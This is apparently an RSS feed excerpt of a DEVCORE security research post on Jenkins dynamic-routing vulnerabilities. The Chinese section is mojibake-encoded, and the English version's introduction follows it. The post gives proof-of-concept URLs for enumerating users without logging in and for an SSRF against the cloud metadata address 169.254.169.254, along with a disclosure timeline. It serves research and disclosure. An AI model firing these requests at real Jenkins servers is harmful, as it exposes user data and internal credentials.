&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰∏äÈù¢ÁöÑÂü∑Ë°åÈèà‰∏ÄÂÄã‰∏≤‰∏ÄÂÄãÈõñÁÑ∂ÁúãËµ∑‰æÜÂæàÊµÅÊö¢, ‰ΩÜÈõ£ÈÅéÁöÑÊòØÁÑ°Ê≥ïÂèñÂæóÂõûÂÇ≥ÂÖßÂÆπ, Âõ†Ê≠§Âö¥Ê†º‰æÜË™™‰∏çËÉΩÁÆóÊòØ‰∏ÄÂÄãÈ¢®Èö™, ‰ΩÜÈÄôÂÄã‰æãÂ≠êÂ∞çÊñºÁêÜËß£Êï¥ÂÄãÊºèÊ¥ûÊ†∏ÂøÉÂçªÊúâÂæàÂ§ßÁöÑÂπ´Âä©!&lt;/p&gt;

&lt;p&gt;Âú®‰∫ÜËß£ÂéüÁêÜÂæå, Ââ©‰∏ãÁöÑ‰∫ãÂ∞±ÂÉèÊòØÂú®Ëß£‰∏ÄÂÄãËø∑ÂÆÆ, Âæû &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; ÈÄôÂÄãÂÖ•Âè£ÈªûÈñãÂßã, Áâ©‰ª∂‰∏≠ÁöÑÊØèÂÄãÊàêÂì°ÂèàÂèØ‰ª•ÂèÉËÄÉÂà∞‰∏ÄÂÄãÊñ∞ÁöÑÁâ©‰ª∂, Êé•ËëóË¶ÅÂÅöÁöÑÂ∞±ÊòØÊÉ≥Ëæ¶Ê≥ïÊää‰∏≠ÈñìÈåØÁ∂úË§áÈõúÂêÑÁ®ÆÁâ©‰ª∂ËàáÁâ©‰ª∂ÈñìÁöÑÈóúËÅØÊâæÂá∫‰æÜ, ‰∏ÄÂ±§‰∏ÄÂ±§ÁöÑ‰∏≤‰∏ãÂéªÁõ¥Âà∞Ëø∑ÂÆÆÂá∫Âè£ - ‰πüÂ∞±ÊòØÂç±Èö™ÁöÑÂáΩÊï∏ÂëºÂè´!&lt;/p&gt;

&lt;p&gt;ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØ, ÈÄôÂÄãÊºèÊ¥ûÊúÄÂèØÊÉúÁöÑÂú∞ÊñπÊáâË©≤ÊòØÁÑ°Ê≥ïÈáùÂ∞ç SETTER ÈÄ≤Ë°åÊìç‰Ωú, ‰∏çÁÑ∂ÁöÑË©±ÊáâË©≤Â∞±ÂèàÊòØÂè¶Â§ñ‰∏ÄÂÄãÊúâË∂£ÁöÑ &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; ÊàñÊòØ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt; ‰∫Ü!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÂà©Áî®&quot;&gt;Â¶Ç‰ΩïÂà©Áî®&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;ÊâÄ‰ª•Ë©≤Â¶Ç‰ΩïÂà©Áî®ÈÄôÂÄãÊºèÊ¥ûÂë¢? Á∞°ÂñÆË™™, ÈÄôÂÄãÊºèÊ¥ûÊâÄËÉΩÂÅöÂà∞ÁöÑ‰∫ãÊÉÖÂ∞±Âè™ÊòØÈÄèÈÅéÁâ©‰ª∂ÈñìÁöÑÂèÉËÄÉÂéªÁπûÈÅé ACL ÊîøÁ≠ñ, ‰ΩÜÂú®Ê≠§‰πãÂâçÊàëÂÄëÂøÖÈ†àÂÖàÊâæÂà∞‰∏ÄÂÄãÂ•ΩÁöÑË∑≥ÊùøÂ•ΩËÆìÊàëÂÄëÂèØ‰ª•Êõ¥Êñπ‰æøÁöÑÂú®Áâ©‰ª∂‰∏≠Ë∑≥‰æÜË∑≥Âéª, ÈÄôË£°ÊàëÂÄëÈÅ∏Áî®‰∫Ü‰∏ãÈù¢ÈÄôÂÄãË∑≥Êùø:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÂÄãË∑≥ÊùøÊúÉ‰æùÂ∫èÂü∑Ë°å‰∏ãÈù¢ÊñπÊ≥ï&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú® Jenkins ‰∏≠ÂèØ‰ª•Ë¢´Êìç‰ΩúÁöÑÁâ©‰ª∂ÈÉΩÊúÉÁπºÊâø‰∏ÄÂÄã &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt; È°ûÂà•, ËÄåÁπºÊâøÈÄôÂÄãÈ°ûÂà•ÁöÑÁâ©‰ª∂ÈÉΩÂèØ‰ª•ÈÄèÈÅé &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt; ÂéªÂ≠òÂèñ, ÊâÄ‰ª•Á∏ΩÈ´î‰æÜË™™, ÂèØÈÄèÈÅéÈÄôÂÄãË∑≥ÊùøÂèñÂæóÂú® Jenkins ‰∏≠Á¥Ñ 500 ÂÄã Despicable ÁöÑÁâ©‰ª∂È°ûÂà•!&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÈõñÊòØÂ¶ÇÊ≠§, Áî±Êñº Jenkins ÁöÑË®≠Ë®àÊ®°Âºè, Â§ßÈÉ®ÂàÜÈñãÁôºËÄÖÂú®Âç±Èö™Âãï‰Ωú‰πãÂâçÈÉΩÊúÉÂÜçÂÅö‰∏ÄÊ¨°Ê¨äÈôêÊ™¢Êü•, ÊâÄ‰ª•Âç≥‰ΩøÂèØÂëºÂè´Âà∞ &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt; ‰ΩÜÂú®Ê≤íÊúâ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt; Ê¨äÈôêÁöÑÊÉÖÊ≥Å‰∏ã‰πüÁÑ°Ê≥ïÂÅö‰ªª‰Ωï‰∫ã :(&lt;/p&gt;

&lt;p&gt;‰ΩÜÈÄôÂÄãÊºèÊ¥û‰æùÁÑ∂‰∏çÂ§±ÊàêÁÇ∫‰∏ÄÂÄãÂæàÂ•ΩÁöÑËÜ†Ê∞¥ÂéªÁπûÈÅéÁ¨¨‰∏ÄÂ±§ÁöÑ ACL ÈôêÂà∂‰∏≤Ëµ∑ÂÖ∂‰ªñÁöÑÊºèÊ¥û, ÁÇ∫ÂæåÁ∫åÁöÑÂà©Áî®ÈñãÂïü‰∫Ü‰∏ÄÈÅìÁ™ó! ‰ª•‰∏ãÊàëÂÄëÁµ¶Âá∫‰∏âÂÄã‰∏≤Âá∫ÊºèÊ¥ûÈèàÁöÑ‰æãÂ≠ê!
(ÈõñÁÑ∂Âè™‰ªãÁ¥π‰∏âÁ®Æ, ‰ΩÜÁî±ÊñºÈÄôÂÄãÊºèÊ¥ûÁé©Ê≥ïÈùûÂ∏∏Ëá™Áî±ÂèØ‰∏≤ÁöÑÁµï‰∏çÂè™Â¶ÇÊ≠§, Êé®Ëñ¶ÊúâËààË∂£ÁöÑÂêåÂ≠∏ÂèØÂú®Â∞ãÊâæÊõ¥Â§öÁöÑÊºèÊ¥ûÈèà!)&lt;/p&gt;

&lt;p&gt;P.S. ÂÄºÂæóÊ≥®ÊÑèÁöÑ‰∏ÄÈªûÊòØ, Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt; ÁöÑÂØ¶Áèæ‰∏≠ÊúÉÂëºÂè´Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; ‰∏¶‰∏îÂÇ≥ÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create=True&lt;/code&gt; Â∞éËá¥Âú®Ë®òÊÜ∂È´î‰∏≠ÂâµÈÄ†Âá∫‰∏ÄÂÄãÊö´Â≠ò‰ΩøÁî®ËÄÖ(ÊúÉÂá∫ÁèæÂú®‰ΩøÁî®ËÄÖÂàóË°®‰ΩÜÁÑ°Ê≥ïÈÄ≤Ë°åÁôªÂÖ•Êìç‰Ωú), ÈõñÁÑ∂ÁÑ°Áî®‰∏çÈÅé‰πüË¢´Áï∂Êàê‰∏ÄÂÄãÊºèÊ¥ûË®òÈåÑÂú® &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-ÂÖçÁôªÂÖ•ÁöÑ‰ΩøÁî®ËÄÖË≥áË®äÊ¥©Êºè&quot;&gt;1. ÂÖçÁôªÂÖ•ÁöÑ‰ΩøÁî®ËÄÖË≥áË®äÊ¥©Êºè&lt;/h3&gt;

&lt;p&gt;Âú®Ê∏¨Ë©¶ Jenkins ÊôÇ, ÊúÄÊÄïÁöÑÂ∞±ÊòØË¶ÅÈÄ≤Ë°åÂ≠óÂÖ∏Ê™îÊîªÊìäÊôÇÂçª‰∏çÁü•ÈÅìË©≤ÊîªÊìäÂì™ÂÄãÂ∏≥Ëôü, Áï¢Á´üÂ∏≥ËôüÊ∞∏ÈÅ†ÊØîÂØÜÁ¢ºÈõ£Áåú! ÈÄôÊôÇÈÄôÂÄãÊºèÊ¥ûÂ∞±ÂæàÂ•ΩÁî®‰∫ÜXD&lt;/p&gt;

&lt;p&gt;Áî±Êñº Jenkins Â∞çÊêúÂ∞ãÁöÑÂäüËÉΩ‰∏¶Ê≤íÊúâÂä†‰∏äÈÅ©Áï∂ÁöÑÊ¨äÈôêÊ™¢Êü•, Âõ†Ê≠§Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ÁöÑÁãÄÊ≥Å‰∏ãÂèØ‰ª•ÈÄèÈÅé‰øÆÊîπ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; ÂèÉÊï∏Âæû a Âà∞ z ÂéªÂàóËàâÂá∫ÊâÄÊúâ‰ΩøÁî®ËÄÖ!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Èô§Ê≠§‰πãÂ§ñ‰πüÂèØÊê≠ÈÖçÁî± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; ÊâÄÂõûÂ†±ÁöÑ &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; ÈÄ≤‰∏ÄÊ≠•ÂèñÂæó‰ΩøÁî®ËÄÖ‰ø°ÁÆ±, Â¶Ç:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/api/xml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-Ëàá-cve-2018-1000600-Êê≠ÈÖçÊàêÂÖçÁôªÂÖ•‰∏îÊúâÂÆåÊï¥ÂõûÈ°ØÁöÑ-ssrf&quot;&gt;2. Ëàá CVE-2018-1000600 Êê≠ÈÖçÊàêÂÖçÁôªÂÖ•‰∏îÊúâÂÆåÊï¥ÂõûÈ°ØÁöÑ SSRF&lt;/h3&gt;

&lt;p&gt;‰∏ã‰∏ÄÂÄãË¶Å‰∏≤ÁöÑÊºèÊ¥ûÂâáÊòØ &lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600&lt;/a&gt;, ÈÄôÊòØ‰∏ÄÂÄãÁî± &lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;Orange Tsai&lt;/a&gt;(Â∞çÂ∞±ÊòØÊàëXD) ÊâÄÂõûÂ†±ÁöÑÊºèÊ¥û, ÈóúÊñºÈÄôÂÄãÊºèÊ¥ûÂÆòÊñπÁöÑÊèèËø∞ÊòØ:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;CSRF vulnerability and missing permission checks in GitHub Plugin allowed capturing credentials&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âú®Â∑≤Áü• Credentials ID ÁöÑÊÉÖÂΩ¢‰∏ãÂèØ‰ª•Ê¥©Êºè‰ªªÊÑè Jenkins ÂÑ≤Â≠òÁöÑÂ∏≥ÂØÜ, ‰ΩÜ Credentials ID Âú®Ê≤íÊåáÂÆöÁöÑÊÉÖÊ≥Å‰∏ãÊúÉÊòØ‰∏ÄÁµÑÈö®Ê©üÁöÑ UUID ÊâÄ‰ª•ÈÄ†ÊàêË¶ÅÂà©Áî®ÈÄôÂÄãÊºèÊ¥û‰ºº‰πéËÆäÂæó‰∏çÂ§™ÂèØËÉΩ (Â¶ÇÊûúÊúâ‰∫∫Áü•ÈÅìÊÄéÈ∫ºÂèñÂæó Credentials ID Ë´ãÂëäË®¥Êàë!)&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂Âú®‰∏çÁü•ÈÅì Credentials ID ÁöÑÊÉÖÊ≥Å‰∏ãÁÑ°Ê≥ïÊ¥©Êºè‰ªª‰ΩïÂ∏≥ÂØÜ, ‰ΩÜÈÄôÂÄãÊºèÊ¥ûÂÖ∂ÂØ¶‰∏çÂè™ÈÄôÊ®£, ÈÇÑÊúâÂè¶‰∏ÄÂÄãÁé©Ê≥ï! ÈóúÊñºÈÄôÂÄãÊºèÊ¥ûÊúÄÂ§ßÁöÑÂç±ÂÆ≥ÂÖ∂ÂØ¶‰∏çÊòØ CSRF, ËÄåÊòØ SSRF!&lt;/p&gt;

&lt;p&gt;‰∏çÂÉÖÂ¶ÇÊ≠§, ÈÄôÂÄã SSRF ÈÇÑÊòØ‰∏ÄÂÄãÊúâÂõûÈ°ØÁöÑ SSRF! Ê≤íÊúâÂõûÈ°ØÁöÑ SSRF Ë¶ÅÂà©Áî®Ëµ∑‰æÜÊúâÂ§öÂõ∞Èõ£ÊàëÊÉ≥Â§ßÂÆ∂ÈÉΩÁü•ÈÅì :P Âõ†Ê≠§‰∏ÄÂÄãÊúâÂõûÈ°ØÁöÑ SSRF ‰πüÂ∞±È°ØÂæó‰ΩïÂÖ∂ÁèçË≤¥!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-Êú™Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å&quot;&gt;3. Êú™Ë™çË≠âÁöÑÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°å&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ÊâÄ‰ª•Âª¢Ë©±Â∞ëË™™, RCE Âú®Âì™?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÊúÄÂ§ßÁ®ãÂ∫¶ÁöÑÂéªÂà©Áî®ÈÄôÂÄãÊºèÊ¥û, Êàë‰πüÊåñ‰∫Ü‰∏ÄÂÄã&lt;strong&gt;ÈùûÂ∏∏ÊúâË∂£&lt;/strong&gt;ÁöÑ RCE ÂèØ‰ª•ËàáÈÄôÂÄãÊºèÊ¥ûÊê≠ÈÖç‰ΩøÁî®ÊàêÁÇ∫‰∏ÄÂÄãÁúüÊ≠£ÊÑèÁæ©‰∏ä‰∏çÁî®Ë™çË≠âÁöÑ RCE! ‰ΩÜÁî±ÊñºÈÄôÂÄãÊºèÊ¥ûÁõÆÂâçÈÇÑÂú® Responsible Disclosure ÁöÑÊôÇÁ®ãÂÖß, Â∞±Ë´ãÂÖàÊúüÂæÖ Hacking Jenkins Part 2 Âõâ!
(È†êË®à‰∫åÊúà‰∏≠ÈáãÂá∫!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;ÈÄôË£°ÊòØ‰∏Ä‰∫õÊàëÊÉ≥ÁπºÁ∫åÁ†îÁ©∂ÁöÑÊñπÂêë, ÂèØ‰ª•ËÆìÈÄôÂÄãÊºèÊ¥ûËÆäÂæóÊõ¥ÂÆåÁæé! Â¶ÇÊûú‰Ω†ÁôºÁèæ‰∫Ü‰∏ãÈù¢‰ªª‰Ωï‰∏ÄÂÄãÁöÑËß£Ê≥ïË´ãÂãôÂøÖÂëäË®¥Êàë, ÊàëÊúÉÂæàÊÑüÊøÄÁöÑXD&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ÁöÑÊ¨äÈôê‰∏ãÊãøÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; ÁöÑÁâ©‰ª∂ÂèÉËÄÉ, Â¶ÇÊûúÊãøÂà∞ÁöÑÂèØ‰ª•ÁπûÈÅé &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; Ëàá &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; ÊâÄÈúÄÁöÑÊúÄÂ∞èÊ¨äÈôêÈôêÂà∂, ÊàêÁÇ∫‰∏ÄÂÄãÁúüÊ≠£ÊÑèÁæ©‰∏äÁöÑÂÖçÁôªÂÖ•‰ªªÊÑèËÆÄÊ™î!&lt;/li&gt;
  &lt;li&gt;Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; ÁöÑÊ¨äÈôê‰∏ãÊâæÂá∫Âè¶‰∏ÄÁµÑË∑≥ÊùøÂéªÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt;. ÁÇ∫‰∫Ü‰øÆÂæ© &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins Âæû 2.138 ÈñãÂßãÂ∞ç &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; Â¢ûÂä†Âà§Êñ∑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt; ÁöÑ&lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;Ê™¢Êü•&lt;/a&gt;, Â∞éËá¥ÂéüÊúâÁöÑË∑≥ÊùøÂ§±Êïà!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Ëá¥Ë¨ù&quot;&gt;Ëá¥Ë¨ù&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;ÊúÄÂæå, ÊÑüË¨ù Jenkins Security ÂúòÈöäÂ∞§ÂÖ∂ÊòØ Daniel Beck ÁöÑÊ∫ùÈÄöÂçîË™øËàáÊºèÊ¥û‰øÆÂæ©! ÈÄôË£°ÊòØ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÂõûÂ†±ÊôÇÈñìËª∏:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - ÂõûÂ†±ÊºèÊ¥ûÁµ¶ Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins ‰øÆË£ú‰∏¶ÂàÜÈÖç CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins ‰øÆË£ú‰∏¶ÂàÜÈÖç CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins ‰øÆÂæ©‰∏¶ÂàÜÈÖç CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins ‰øÆË£ú‰∏¶ÂàÜÈÖç CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - ÂõûÂ†± Groovy ÊºèÊ¥ûÁµ¶ Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins ‰øÆÂæ© Groovy ÊºèÊ¥û‰∏¶ÂàÜÈÖç CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In software engineering, the &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; is a best practice for developers to reduce routine works. In the CI/CD, the most well-known tool is Jenkins. Due to its ease of use, awesome Pipeline system and integration of Container, Jenkins is also the most widely used CI/CD application in the world. According to the &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM Ecosystem Report&lt;/a&gt; by Snyk in 2018, Jenkins held about 60% market share on the survey of CI/CD server.&lt;/p&gt;

&lt;p&gt;For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that the whole corporation is compromised from simply a Jenkins server as our entry point!&lt;/p&gt;

&lt;p&gt;This article is mainly about a brief security review on Jenkins in the last year. During this review, we found 5 vulnerabilities including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Among them, the more discussed one is the vulnerability CVE-2018-1999002. This is an arbitrary file read vulnerability through an unusual attack vector! Tencent YunDing security lab has written a &lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;detailed advisory&lt;/a&gt; about that, and also demonstrated how to exploit this vulnerability from arbitrary file reading to RCE on a real Jenkins site which found from &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;!&lt;/p&gt;

